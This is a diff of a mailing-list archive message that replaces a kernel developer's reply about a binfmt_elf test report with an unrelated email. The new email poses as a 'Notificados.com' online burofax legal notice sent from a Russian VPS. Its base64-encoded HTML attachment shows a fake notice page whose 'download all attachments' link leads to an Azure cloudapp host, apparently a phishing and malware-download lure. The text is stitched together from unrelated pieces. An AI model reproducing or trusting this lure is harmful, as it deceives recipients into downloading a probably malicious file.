@@ -1,46 +1,68 @@
-Content-Type: multipart/mixed; boundary="===============3947700001454993975=="
+Content-Type: multipart/mixed; boundary="===============8208444388120694612=="
 MIME-Version: 1.0
-From: Geert Uytterhoeven <geert@linux-m68k.org>
+From: Notificados.com <notificaciones@notificados.com>
 To: lkp@lists.01.org
-Subject: Re: [binfmt_elf] d97e11e25d: ltp.DS000.fail
-Date: Tue, 26 Jan 2021 09:03:26 +0100
-Message-ID: <CAMuHMdUFsRSCDJeML+0i17ig6oFr+-cz660xyhkhkfg2UtPTzQ@mail.gmail.com>
-In-Reply-To: <20210126055112.GA19582@xsang-OptiPlex-9020>
+Subject: Envio de Burofax Online - [ id 394283110 ]
+Date: Tue, 26 Jan 2021 23:16:38 +0000
+Message-ID: <20210126231638.2B8C429EB9A0@194-58-98-152.ovz.vps.regruhosting.ru>
 List-Id: <oe-lkp.lists.linux.dev>
 
---===============3947700001454993975==
+--===============8208444388120694612==
 Content-Type: text/plain; charset="utf-8"
 MIME-Version: 1.0
 Content-Transfer-Encoding: quoted-printable
 
-Hi Oliver,
 
-On Tue, Jan 26, 2021 at 6:35 AM kernel test robot <oliver.sang@intel.com>=
- wrote:
-> FYI, we noticed the following commit (built with gcc-9):
->
-> commit: d97e11e25dd226c44257284f95494bb06d1ebf5a ("[PATCH v2] binfmt_elf:=
- Fix fill_prstatus() call in fill_note_info()")
-> url: https://github.com/0day-ci/linux/commits/Geert-Uytterhoeven/binfmt_e=
-lf-Fix-fill_prstatus-call-in-fill_note_info/20210106-155236
-> base: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git e71=
-ba9452f0b5b2e8dc8aa5445198cd9214a6a62
+--===============8208444388120694612==
+Content-Type: text/html
+MIME-Version: 1.0
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="attachment.htm"
 
-My patch (which you applied on top of v5.11-rc2) is a build fix for
-a commit that is not part of v5.11-rc2.  Hence the test run is invalid.
-
-Gr{oetje,eeting}s,
-
-                        Geert
-
--- =
-
-Geert Uytterhoeven -- There's lots of Linux beyond ia32 -- geert(a)linux-m6=
-8k.org
-
-In personal conversations with technical people, I call myself a hacker. But
-when I'm talking to journalists I just say "programmer" or something like t=
-hat.
-                                -- Linus Torvalds
---===============3947700001454993975==--
+PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0
+PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNl
+LXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+RG9jdW1lbnQ8L3RpdGxlPgo8
+L2hlYWQ+CjxzdHlsZT4KCmJvZHl7Cgljb2xvcjojMDkwOTA5Owp9CiAgICAuY2FiZWNhewogICAg
+ICAgIG1hcmdpbjogMCBhdXRvOwogICAgICAgIGhlaWdodDogNDBweDsKICAgICAgICB3aWR0aDog
+NTAwcHg7CiAgICAgICAKICAgIH0KCiAgICAuYWNpbWF7CiAgICAgIAogICAgICAgIGhlaWdodDog
+MzBweDsKICAgIH0KCiAgICAubGFkb3sKICAgICAgICBmb250LXNpemU6IDMwcHg7CiAgICAgICAg
+Zm9udC13ZWlnaHQ6IDUwMDsKICAgICAgICBtYXJnaW4tbGVmdDogNDBweDsKICAgICAgICBmbG9h
+dDogbGVmdDsKICAgIH0KICAuZ3JhbmRlewogICAgICBmb250LXNpemU6IDE1cHg7CiAgfQoKICAu
+YWNpbWEyewogICAgICBmbG9hdDpyaWdodDsKICAgICAgbWFyZ2luLXRvcDogMzBweDs7CiAgICAg
+IAogIH0KCiAgLmRlcG9pc3sKICAgIGZsb2F0OnJpZ2h0OwogICAgdGV4dC1hbGlnbjogcmlnaHQ7
+CiAgfQoKLnBpY3sKICAgCiAgICBmb250LXNpemU6IDMwcHg7Cgp9CgoucGljMnsKICAgIG1hcmdp
+bi1sZWZ0OiA2NSU7CiAKICAgCn0KIAogLnBpYzIgLm5vbWVzewogICAgZm9udC1zaXplOiAzMHB4
+OwogICAgZmxvYXQ6IGxlZnQ7CiB9CgogLm5leHR7CiAgICAgZm9udC1zaXplOiAzMHB4OwogICAg
+IG1hcmdpbi10b3A6IDQwJTsKICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgdGV4dC1kZWNv
+cmF0aW9uOiBub25lOwogfQoKIC5uZXh0IGF7CiAgICB0ZXh0LWRlY29yYXRpb246bm9uZTsgCiAg
+ICBjb2xvcjogIzAwMDBmZjsKCWZvbnQtc2l6ZTogMTlweDsKIH0KCiAuZmluYWx7CiAgICAgZm9u
+dC13ZWlnaHQ6IGJvbGQ7CiAgICAgZm9udC1zaXplOiAxM3B4OwogfQogCiAuaW1nLXJpZ2h0ewoJ
+ZmxvYXQ6cmlnaHQ7CgoKCW1hcmdpbi1yaWdodDotMTAwcHg7CgkKIH0KIDwvc3R5bGU+Cjxib2R5
+PgogICAgCiA8ZGl2IGNsYXNzPSJjYWJlY2EiPgogICAgPGhyPgogICAgPGRpdiBjbGFzcz0iYWNp
+bWEiPgogICAgICAgIDxkaXYgY2xhc3M9ImxhZG8iPgogICAgICAgICAgICA8c3Ryb25nIGFsdD0i
+YnVyb2ZheCIgPk5vdGlmaWNhZG9zPC9zdHJvbmc+CiAgICAgICAgICAgIDxicj4KICAgICAgICAg
+ICA8ZGl2IGNsYXNzPSJncmFuZGUiIGFsdD0iYnVyb2ZheCIgPgogICAgICAgICAgICB3d3cubm90
+aWZpY2Fkb3MuY29tCiAgICAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCjxkaXYgY2xhc3M9ImFj
+aW1hMiIgYWx0PSJidXJvZmF4IiA+CiAgIDxzdHJvbmcgIGFsdD0iYnVyb2ZheCIgPiBDb211bmlj
+YWNpb25lcyBmZWhhY2llbnRlcyAtIEJ1cm9mYXggT25saW5lPC9zdHJvbmc+CjwvZGl2Pgo8QlI+
+CjwvQlI+Cjxicj4KPGJyPgoKPGRpdiBjbGFzcz0iY2FiZWNhIiAgYWx0PSJidXJvZmF4Ij4KICAg
+IDxpbWcgY2xhc3M9ImltZy1yaWdodCIgc3JjPSJodHRwczovL3VwbG9hZGRlaW1hZ2Vucy5jb20u
+YnIvaW1hZ2VzLzAwMy8wMjUvMTY5L29yaWdpbmFsL2J1cm9mYXgucG5nIiBhbHQ9ImJ1cm9mYXgi
+Pgo8L2Rpdj4KCgogPGRpdiBjbGFzcz0ibmV4dCIgIGFsdD0iYnVyb2ZheCIgPgogICAgIDxzdHJv
+bmc+CiAgICAgICAgIDxhIGhyZWY9Imh0dHA6Ly9ub3RpZmljYWRvc2J1cm9mYXguZWFzdHVzLmNs
+b3VkYXBwLmF6dXJlLmNvbS8iICBhbHQ9ImJ1cm9mYXgiID5EZXNjYXJnYXIgdG9kb3MgYXJjaGl2
+b3MgYWRqdW50b3MgKCAxMjgga2IpPC9hPgogICAgIDwvc3Ryb25nPgogPC9kaXY+CgogPGJyPgog
+PGJyPgogPGJyPgoKICAgICAgICA8ZGl2IGNsYXNzPSJmaW5hbCIgYWx0PSJidXJvZmF4IiA+CiAg
+ICAgICAgCiAgICAgICAgICAgIDxzcGFuIGFsdD0iYnVyb2ZheCI+CiAgICAgICAgICAgICAgICBG
+ZWNoYSB5IGhvcmEgZGVsIGVudmlvOiBKdWV2ZXMsIDI2IGRhIGVuZXJvIGRlIDIwMjEsIDExOjIw
+IGhzLAogICAgICAgICAgICA8L3NwYW4+CiAgICAgICAgICAgIDxici8+CiAgICAgICAgICAgIDxz
+cGFuIGFsdD0iYnVyb2ZheCI+CiAgICAgICAgICAgICAgICBSZW1pdGVudGU6IGRlcG9pc0FSVEFN
+RU5UTyBKVVJJRElDTyBBQk9HQURPUyBWSU5BUiBET0dBUklBIFZFUkRVIENBTExFIExJTUEKICAg
+ICAgICAgICAgPC9zcGFuPgogICAgICAgICAgICA8YnIvPgogICAgICAgICAgICA8c3BhbiBhbHQ9
+ImJ1cm9mYXgiPgogICAgICAgICAgICAgICAgMjAgMjgwMDYgTUFEUklEIChNQURSSUQpCiAgICAg
+ICAgICAgIDwvc3Bhbj4KICAgICAgICAgICAgPGJyLz4KICAgICAgICAgICAgPHNwYW4gYWx0PSJi
+dXJvZmF4Ij4KICAgICAgICAgICAgICAgIE51bWVybyBkZSBwYWdpbmFzIDEKICAgICAgICAgICAg
+PC9zcGFuPgogICAgICAgIDwvZGl2Pgo8aHI+CjwvZGl2PgoKIDwvZGl2PgogICAgCjwvYm9keT4K
+PC9odG1sPjI2LzAxLzIwMjEgMTE6MTY6Mzg=
+--===============8208444388120694612==--
 
